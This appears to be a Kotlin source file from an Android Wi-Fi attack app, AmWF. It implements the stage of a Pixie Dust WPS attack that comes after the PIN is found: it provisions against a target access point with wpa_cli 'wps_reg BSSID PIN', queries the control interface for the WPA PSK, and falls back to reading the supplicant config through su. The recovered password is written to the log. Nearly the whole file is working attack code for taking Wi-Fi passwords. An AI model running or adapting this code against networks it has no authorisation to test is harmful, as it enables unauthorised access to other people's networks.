/*
 * AmWF - Android WiFi Monitor Mode Controller
 * Copyright (C) 2026 Hitomatito
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

package com.hitomatito.amwf.wifi.pixiedust

import android.content.Context
import com.hitomatito.amwf.ShellExecutor
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay
import kotlinx.coroutines.withTimeoutOrNull

/** Valor que usa wpa_supplicant para ocultar campos de clave en el control interface. */
internal const val MASKED_PSK = "*"

/**
 * Extrae el PSK de la salida de `wpa_cli get_network <id> psk`.
 *
 * wpa_supplicant no expone el `psk` (devuelve `*`) para no filtrar material
 * sensible; ese valor no es una clave válida y debe descartarse para que el
 * flujo caiga al config guardado.
 */
internal fun parsePskFromControlOutput(output: String): String? =
    output.lineSequence()
        .map { it.trim() }
        .filter {
            it.isNotEmpty() &&
                it != "OK" &&
                !it.startsWith("Selected interface") &&
                !it.startsWith("Using interface") &&
                !it.contains("UNKNOWN COMMAND", ignoreCase = true) &&
                !it.contains("FAIL", ignoreCase = true)
        }
        .map { it.removePrefix("psk=").trim('"').trim() }
        .firstOrNull { it.isNotBlank() && it != MASKED_PSK }

/** true si la salida del control interface es el PSK enmascarado por wpa_supplicant. */
internal fun isMaskedPskOutput(output: String): Boolean =
    output.lineSequence().any {
        it.trim().removePrefix("psk=").trim('"').trim() == MASKED_PSK
    }

/**
 * Extrae el PSK de un config de wpa_supplicant para la red [ssid].
 *
 * El config puede contener varias redes guardadas; devolver el primer `psk=`
 * arriesgaba entregar la clave de otra red. Se parsean los bloques
 * `network={...}` y se elige el que casa por SSID. Si [ssid] es nulo o vacío,
 * se mantiene el comportamiento anterior (primer PSK no enmascarado).
 *
 * Los SSID son sensibles a mayúsculas, así que la comparación es exacta.
 * wpa_supplicant puede escribirlos entre comillas o en hexadecimal; ambos
 * formatos se decodifican.
 */
internal fun parsePskFromConfigText(config: String, ssid: String?): String? {
    val blocks = mutableListOf<MutableList<String>>()
    var current: MutableList<String>? = null
    for (rawLine in config.lineSequence()) {
        val line = rawLine.trim()
        when {
            line.startsWith("network=") -> {
                val block = mutableListOf<String>()
                blocks.add(block)
                current = block
                // Soporta el formato compacto `network={ ssid="x" psk="y" }`.
                val inline = line.substringAfter('{', "").substringBefore('}').trim()
                if (inline.isNotEmpty()) {
                    inline.split(Regex("\\s+")).forEach(block::add)
                }
            }
            line == "}" -> current = null
            current != null && line.isNotEmpty() -> current?.add(line)
        }
    }

    val target = ssid?.trim()?.takeIf { it.isNotEmpty() }
    val candidates = if (target == null) {
        blocks
    } else {
        blocks.filter { block -> blockSsid(block) == target }
            // Si el config solo tiene una red, se usa aunque el SSID no case
            // (p. ej. escape inesperado): es la red que acaba de crear wps_reg.
            .ifEmpty { if (blocks.size == 1) blocks else emptyList() }
    }

    return candidates.asSequence()
        .mapNotNull { block -> block.firstOrNull { it.startsWith("psk=") } }
        .map { decodeWpaValue(it.removePrefix("psk=").trim()) }
        .firstOrNull { it.isNotBlank() && it != MASKED_PSK }
}

private fun blockSsid(block: List<String>): String? =
    block.firstOrNull { it.startsWith("ssid=") }
        ?.removePrefix("ssid=")
        ?.trim()
        ?.let(::decodeWpaValue)

/** Decodifica un valor de wpa_supplicant: comillas con escapes o hex UTF-8. */
private fun decodeWpaValue(raw: String): String {
    if (raw.length >= 2 && raw.startsWith('"') && raw.endsWith('"')) {
        return unescapeQuoted(raw.substring(1, raw.length - 1))
    }
    if (raw.isNotEmpty() && raw.length % 2 == 0 &&
        raw.all { it.isDigit() || it in 'a'..'f' || it in 'A'..'F' }
    ) {
        val bytes = ByteArray(raw.length / 2) { index ->
            raw.substring(index * 2, index * 2 + 2).toInt(16).toByte()
        }
        return bytes.toString(Charsets.UTF_8)
    }
    return raw
}

private fun unescapeQuoted(value: String): String {
    val out = StringBuilder(value.length)
    var index = 0
    while (index < value.length) {
        val char = value[index]
        if (char == '\\' && index + 1 < value.length) {
            out.append(value[index + 1])
            index += 2
        } else {
            out.append(char)
            index++
        }
    }
    return out.toString()
}

/**
 * Obtiene el PSK WPA de la red tras conocer el PIN WPS.
 *
 * Reutiliza el mismo arranque de supplicant que el ataque
 * ([SupplicantProcesses.launch]) y hace la provisión WPS con el PIN hallado,
 * consultando después el PSK por la interfaz de control y, si no aparece, en
 * el config guardado.
 */
internal class PixiePskExtractor(
    private val context: Context,
    private val supplicant: SupplicantProcesses
) {

    suspend fun extract(
        bssid: String,
        iface: String,
        ssid: String,
        pin: String,
        rawOutput: StringBuilder,
        log: (String) -> Unit
    ): String? = withTimeoutOrNull(PSK_EXTRACT_TIMEOUT_MS) {
        // El hilo lector solo encola: la corrutina es la única que escribe en
        // el StringBuilder crudo y en la consola.
        var handle: SupplicantProcesses.Handle? = null
        try {
            log("[*] ===== WPA PSK EXTRACTION (SSID: $ssid, WPS PIN: $pin) =====")
            supplicant.stop(null)

            // Mismo arranque que el ataque (ctrl dir, config, socket y PONG):
            // la fase sigue siendo EXTRACTING_PSK, así que launch no toca el
            // tracker.
            handle = supplicant.launch(iface = iface, rawOutput = rawOutput, log = log)
            if (handle == null) {
                log("[-] PSK stage: no se pudo arrancar wpa_supplicant para WPS")
                return@withTimeoutOrNull null
            }
            val supplicantLines = handle.lines

            fun cli(cmd: String): ShellExecutor.Result = supplicant.cli(iface, cmd)

            // wps_reg crea internamente su propia red WPS y la sustituye por la
            // que entrega el AP. No hace falta add_network/set_network: el
            // `set_network ... ssid` siempre fallaba porque wpa_cli espera el
            // SSID entre comillas dobles y el valor llegaba con comillas de
            // shell. Se omite para no ensuciar el log con FAIL inútiles.

            // Sin `freq=`: wpa_cli 2.11 solo acepta BSSID y PIN (o los
            // seis argumentos de reconfiguración del AP). Tampoco se llama a
            // select_network: abortaría la sesión WPS recién iniciada.
            var regAccepted = false
            for (attempt in 1..2) {
                val regResult = cli("wps_reg $bssid $pin")
                val rejected = regResult.exitCode != 0 ||
                    regResult.output.lineSequence().any { it.trim() == "FAIL" }
                if (!rejected) {
                    regAccepted = true
                    break
                }
                val detail = regResult.output.ifBlank { "exit=${regResult.exitCode}" }
                log("[-] wps_reg rejected (attempt $attempt/2): $detail")
                if (attempt < 2) delay(1000)
            }
            if (!regAccepted) {
                log("[-] PSK stage: wps_reg was rejected; aborting PSK extraction")
                return@withTimeoutOrNull null
            }

            log("[*] Waiting for WPS provisioning & PSK (up to ${PSK_WAIT_MS / 1000}s)...")
            val deadline = System.currentTimeMillis() + PSK_WAIT_MS
            var psk: String? = null
            var masked = false
            while (System.currentTimeMillis() < deadline) {
                supplicant.flushLines(supplicantLines, rawOutput, log)
                // wps_reg crea su propia red WPS con un id nuevo: se consultan
                // todas las redes conocidas en lugar de asumir un id fijo.
                val ids = listNetworkIds(::cli)
                var found: String? = null
                for (id in ids) {
                    val result = cli("get_network $id psk")
                    // wpa_supplicant devuelve "*" para no exponer el PSK; no
                    // esperar los 25 s completos: el valor real está en el config.
                    if (isMaskedPsk(result)) {
                        masked = true
                        continue
                    }
                    val value = extractPskValue(result)
                    if (!value.isNullOrEmpty()) {
                        found = value
                        break
                    }
                }
                if (found != null) {
                    psk = found
                    break
                }
                if (masked) break
                delay(1000)
            }

            if (psk == null) {
                log("[*] PSK not in control interface — trying save_config...")
                cli("save_config")
                psk = parsePskFromConfig(ssid)
            }

            if (psk != null) log("[+] WPA PSK: $psk") else log("[-] No PSK obtained from WPS exchange")
            return@withTimeoutOrNull psk
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            ShellExecutor.logE(TAG, "PSK extraction failed", e)
            log("[-] PSK extraction error: ${e.message}")
            return@withTimeoutOrNull null
        } finally {
            // Detiene el supplicant y vuelca la cola antes de que cleanup()
            // borre el ctrl dir: si no, se pierden las últimas líneas del PSK.
            supplicant.stopAndFlush(handle, rawOutput, log)
        }
    }

    /**
     * Extrae los ids de red de la salida de `wpa_cli list_networks`.
     * El formato es `id<TAB>ssid<TAB>bssid<TAB>flags`, con una cabecera que
     * empieza por "network id" y por tanto no se confunde con un id.
     */
    private fun listNetworkIds(cli: (String) -> ShellExecutor.Result): List<String> =
        cli("list_networks").output.lineSequence()
            .mapNotNull { line -> line.trim().takeWhile { it.isDigit() }.toIntOrNull()?.toString() }
            .distinct()
            .toList()

    private fun extractPskValue(result: ShellExecutor.Result): String? {
        if (result.exitCode != 0) return null
        return parsePskFromControlOutput(result.output)
    }

    private fun isMaskedPsk(result: ShellExecutor.Result): Boolean =
        result.exitCode == 0 && isMaskedPskOutput(result.output)

    private fun parsePskFromConfig(ssid: String): String? {
        // El config vive en el directorio de control, no en filesDir: se lee
        // a través de `su` porque la app no tiene acceso SELinux a esa ruta.
        val conf = NativeBinaries.runtimeConfigPath()
        val result = PixieProcessSupport.execSu("cat $conf 2>/dev/null", timeoutSeconds = 3)
        if (result.exitCode != 0) return null
        return parsePskFromConfigText(result.output, ssid)
    }

    companion object {
        private const val TAG = "PixiePskExtractor"

        /** Tiempo máximo de toda la fase de extracción de PSK. */
        private const val PSK_EXTRACT_TIMEOUT_MS = 45_000L

        /** Espera del PSK por la interfaz de control tras aceptar el wps_reg. */
        private const val PSK_WAIT_MS = 25_000L
    }
}
